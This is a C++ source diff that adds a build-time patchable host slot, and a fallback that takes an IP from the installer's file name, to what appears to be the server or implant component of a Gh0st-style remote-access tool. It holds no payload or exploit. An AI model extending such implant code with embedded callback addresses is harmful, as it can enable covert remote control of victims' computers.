@@ -8,6 +8,7 @@
 
 #include "KernelManager.h"
 #include "Login.h"
+#include "HostConfig.h"
 #include <shellapi.h>
 #include <direct.h>
 
@@ -16,6 +17,14 @@
 #pragma comment(lib, "vfw32.lib")
 
 BOOL    bisUnInstall = FALSE;
+
+// Searchable host slot: Client overwrites this region with IP/domain at build time.
+char g_szCfgHost[WG_HOST_SLOT_SIZE] =
+	WG_HOST_MARKER
+	"________________________________________________________________"
+	"________________________________________________________________"
+	"________________________________________________________________"
+	"_______________________________________";
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -167,13 +176,45 @@ BOOL IsPathExist(const CString & csPath)
 
 #include "MainDlg.h"
 #include "resource.h"
-// CServerApp ��ʼ��
+
+// Host from embedded slot (preferred), else legacy Install_<ip>_vN.exe filename.
+static BOOL WgHostSlotIsUnpatched()
+{
+	// Unpatched slot keeps marker prefix and '_' padding at offset 17.
+	// Avoid comparing against a separate string literal of WG_HOST_MARKER
+	// (that would create a second searchable copy in the binary).
+	return g_szCfgHost[0] == 'W'
+		&& g_szCfgHost[16] == '1'
+		&& g_szCfgHost[17] == '_';
+}
+
+static CString WgResolveInstallHost(const CString& strName)
+{
+	if (!WgHostSlotIsUnpatched() && g_szCfgHost[0] != '\0')
+	{
+		CString host(g_szCfgHost);
+		host.Trim();
+		if (!host.IsEmpty())
+			return host;
+	}
+
+	// Legacy: Install_1.2.3.4_v1 -> extract IP between last l and last v
+	int a = strName.ReverseFind(_T('l'));
+	int b = strName.ReverseFind(_T('v'));
+	if (a >= 0 && b > a + 2)
+	{
+		CString strIP = strName.Mid(a + 2, b - a - 3);
+		strIP.Trim(_T("_"));
+		if (!strIP.IsEmpty() && strIP.Find(_T("Install")) < 0)
+			return strIP;
+	}
+	return _T("");
+}
+
 BOOL CServerApp::InitInstance()
 {
 	CString strName = AfxGetApp()->m_pszAppName;
-	int a = strName.ReverseFind('l');
-	int b = strName.ReverseFind('v');
-	CString strIP = strName.Mid(a+2,b-a-3);
+	CString strIP = WgResolveInstallHost(strName);
 
 	if (strName.Find(_T("v1")) != -1)//�����氲װ
 	{
